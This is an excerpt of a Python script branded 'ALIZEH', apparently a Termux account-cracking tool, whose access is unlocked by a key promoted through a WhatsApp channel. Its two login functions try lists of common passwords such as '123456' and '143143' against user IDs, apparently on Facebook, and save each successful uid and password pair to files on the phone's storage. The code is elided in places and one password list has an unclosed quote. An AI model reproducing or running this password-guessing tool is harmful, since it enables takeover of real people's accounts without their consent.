...
channel_link = "https://whatsapp.com/channel/0029VbBln726rsQvPcB1Np25"

# Valid keys (channel par available hogi)
approved_keys = ["MADALIZEH2026"]
...
def first_step():
    ...
    print("[!] Pehle WhatsApp Channel par follow karo.")
...
os.system('clear')
print(' \x1b[38;5;46mALIZEH SERVER LOADING....')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【 A L I Z E H 】𓆪 \x07')
...
def login_1(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ('654321', '123456', '123456789', '1234567890', '12345678', '143143', '012345', '0987654321):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/ALIZEH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
...
def login_2(uid):
    ...
    for pw in ('654321', '143143', '112233', '012345', '@12345'):
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ALIZEH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
